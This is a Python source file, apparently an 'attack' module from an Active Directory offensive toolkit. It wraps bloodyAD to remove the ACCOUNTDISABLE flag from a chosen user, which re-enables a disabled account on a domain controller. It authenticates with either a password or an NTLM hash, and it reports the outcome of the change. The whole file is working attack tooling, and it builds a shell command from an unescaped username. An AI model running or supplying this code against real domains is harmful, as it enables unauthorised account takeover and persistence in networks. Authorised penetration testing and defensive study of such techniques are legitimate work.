from core.colors import red, green, blue, yellow
from core.helpers import run_command

def attack_enableuser(session, target_user=None):
    print(blue("[*] EnableUser Module - Removing 'ACCOUNTDISABLE' from userAccountControl..."))

    # Prompt if no username was passed
    if not target_user or not target_user.strip():
        target_user = input(yellow("[?] Enter the username to enable: ")).strip()

    # Still empty?
    if not target_user:
        print(red("[-] No username provided. Aborting."))
        return

    # Ensure supported auth method
    if not (session.password or session.hash):
        print(red("[-] This module only supports password or hash-based authentication (not Kerberos-only)."))
        return

    # Build auth string
    auth = f"-d {session.domain} -u {session.username} "
    auth += f"-p {session.password}" if session.password else f"-H {session.hash}"

    cmd = (
        f"bloodyAD --host {session.dc_ip} {auth} "
        f"remove uac '{target_user}' -f ACCOUNTDISABLE"
    )

    out, err = run_command(cmd)
    combined = out + "\n" + err
    lower = combined.lower()

    if "removed from" in lower:
        print(green(f"[+] Successfully enabled user '{target_user}'."))
        print(green(out.strip()))
    elif "access is denied" in lower:
        print(red("[-] Access denied. Check your privileges."))
    elif "does not exist" in lower or "not found" in lower:
        print(red("[-] User not found. Double-check the username."))
    else:
        print(yellow("[!] Uncertain result. Full output below:"))
        print(combined.strip())
